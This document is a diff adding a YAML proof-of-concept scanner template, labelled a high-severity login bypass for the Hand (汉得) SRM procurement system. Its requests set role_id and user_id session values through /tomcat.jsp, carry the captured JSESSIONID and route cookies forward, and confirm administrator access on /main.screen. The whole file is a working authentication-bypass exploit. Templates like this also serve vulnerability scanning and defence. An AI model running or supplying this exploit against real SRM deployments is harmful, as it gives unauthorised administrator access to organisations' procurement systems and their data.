@@ -1,0 +1,28 @@
+id: poc-yaml-hande-SRM-login-bypass
+info:
+  name: 汉得-SRM-登陆绕过
+  severity: high
+  tags:
+  - 认证绕过
+  finger: 汉得SRM
+requests:
+- method: GET
+  path: /tomcat.jsp?dataName=role_id&dataValue=1
+  expression: status_code == 200 && contains(body, "role_id") && contains(headers,
+    "Set-Cookie")
+  output:
+  - regex_match(headers, "JSESSIONID=(?P<jsessionid>[^;]+);")
+  - regex_match(headers, "route=(?P<route>[^;]+);")
+- method: GET
+  path: /tomcat.jsp?dataName=user_id&dataValue=1
+  headers:
+    Cookie: JSESSIONID={{.jsessionid}}; route={{.route}}
+  expression: status_code == 200 && contains(body, "user_id")
+- method: GET
+  path: /main.screen
+  headers:
+    Cookie: JSESSIONID={{.jsessionid}}; route={{.route}}
+  expression: status_code == 200 && contains(body, "云系统管理员") && contains(body, "云平台管理")
+    && contains(body, "\"defaultvalue\":\"ADMIN\"")
+variables: {}
+transport: http
